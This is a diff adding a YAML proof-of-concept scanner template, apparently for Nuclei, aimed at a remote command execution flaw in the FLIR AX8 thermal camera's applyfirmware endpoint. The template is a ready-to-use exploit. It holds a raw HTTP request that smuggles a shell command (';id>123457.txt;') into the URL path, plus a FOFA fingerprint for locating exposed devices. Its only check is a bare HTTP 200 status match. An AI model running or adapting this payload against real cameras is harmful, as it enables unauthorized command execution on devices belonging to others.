@@ -1,0 +1,37 @@
+id: poc-yd92larfl7cy63tr
+info:
+  name: FLIR-AX8热成像仪applyfirmware存在远程命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/yd92larfl7cy63tr'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: yd92larfl7cy63tr
+    fofa: web.icon=="f4370ff0b4763e18159cd7cdf36a4542"
+http:
+- raw:
+  - 'GET /settings/applyfirmware/;id>123457.txt;/false HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept-Encoding: gzip, deflate
+
+    Connection: close
+
+    Cookie: ******
+
+    Upgrade-Insecure-Requests: 1
+
+    Priority: u=0, i'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
